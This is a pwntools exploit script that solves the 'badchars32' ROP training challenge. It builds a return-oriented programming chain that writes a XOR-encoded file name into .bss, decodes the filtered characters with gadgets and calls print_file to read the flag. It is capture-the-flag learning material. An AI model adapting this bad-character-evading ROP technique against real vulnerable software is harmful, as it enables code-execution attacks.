#!/bin/python3

from pwn import *

context.clear(arch='i386')
filename = './badchars32'

elf = ELF(filename)
io = process(filename)

# gadgets

xor     = p32(0x8048547)    # xor byte ptr [ebp], bl; ret;
mov     = p32(0x804854f)    # mov dword ptr [edi], esi; ret;
pop_ebp = p32(0x80485bb)    # pop ebp; ret;
pop_ebx = p32(0x804839d)    # pop ebx; ret;
pop_esi = p32(0x80485b9)    # pop esi; pop edi; pop ebp; ret;
bss     = elf.bss()

# helper functions

def write_string(string, index):
    rop = ROP(elf)

    rop.raw(pop_esi)
    rop.raw(string)
    rop.raw(p32(bss+(index*4)))
    rop.raw(b'AAAA') # filler
    rop.raw(mov)

    return rop.chain()

def xor_index(index):
    rop = ROP(elf)

    rop.raw(pop_ebp)
    rop.raw(bss+index)
    rop.raw(pop_ebx)
    rop.raw(0x2)
    rop.raw(xor)

    return rop.chain()

# bad chars 'x' 'g' 'a' '.'
# 7867612e
# xor'd string 'flce,tzt'
# 0x02 key at indexes [2,3,4,6]

payload = b""
payload += cyclic(44)
payload += write_string(b'flce', 0)
payload += write_string(b',tzt', 1)
payload += xor_index(2)
payload += xor_index(3)
payload += xor_index(4)
payload += xor_index(6)

# call print_file
r = ROP(elf)
r.call('print_file', [bss])

payload += r.chain()

io.recvuntil('>')
io.sendline(payload)
io.recvuntil('!\n')
flag = io.recvline().decode().rstrip()
log.success("Flag: {}".format(flag))